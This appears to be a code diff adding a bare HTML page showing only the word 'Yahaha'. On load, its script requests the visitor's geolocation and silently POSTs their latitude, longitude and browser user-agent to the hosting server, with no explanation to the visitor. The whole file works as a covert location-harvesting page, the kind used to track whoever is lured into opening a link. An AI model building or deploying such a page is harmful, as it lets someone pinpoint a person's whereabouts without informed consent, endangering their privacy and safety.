@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  
+<div id="demo">
+  
+</div>
+Yahaha
+
+<script>
+  var x = document.getElementById("demo");
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendPosition);
+    } else {
+      x.innerHTML = "Geolocation is not supported by this browser.";
+    }
+  }
+
+  function sendPosition(position) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/", true);
+    xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
+    xhr.send(JSON.stringify({
+        latitude: position.coords.latitude,
+        longtitude: position.coords.longitude,
+        browserInfo: navigator.userAgent
+    }));
+  }
+  getLocation()
+  </script>
+
+</body>
+</html>
+
